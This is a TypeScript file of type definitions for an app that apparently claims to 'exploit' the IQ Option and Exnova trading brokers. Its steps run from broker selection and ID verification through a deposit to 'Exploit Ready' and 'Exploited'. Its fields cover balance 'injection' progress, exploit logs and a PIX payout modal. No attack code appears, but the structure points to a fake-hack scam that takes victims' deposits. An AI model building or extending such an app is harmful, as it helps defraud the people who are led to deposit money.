/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

export type BrokerType = 'IQ Option' | 'Exnova' | null;

export interface LogEntry {
  id: string;
  timestamp: string;
  text: string;
  type: 'info' | 'warning' | 'success' | 'error' | 'critical';
}

export interface TerminalState {
  logs: LogEntry[];
  isAuthenticating: boolean;
  isAuthenticated: boolean;
}

export interface AppState {
  currentStep: number; // 1: Broker Selection, 2: ID Verification, 3: Deposit, 4: Exploit Ready, 5: Exploited (Success)
  broker: BrokerType;
  userId: string;
  isUserIdVerified: boolean;
  depositStatus: 'idle' | 'clicked' | 'confirmed';
  balance: number;
  isInjecting: boolean;
  injectionProgress: number;
  exploitLogs: string[];
  showPixModal: boolean;
  pixKey: string;
  pixType: 'cpf' | 'email' | 'phone' | 'random';
  pixStatus: 'idle' | 'sending' | 'success';
}
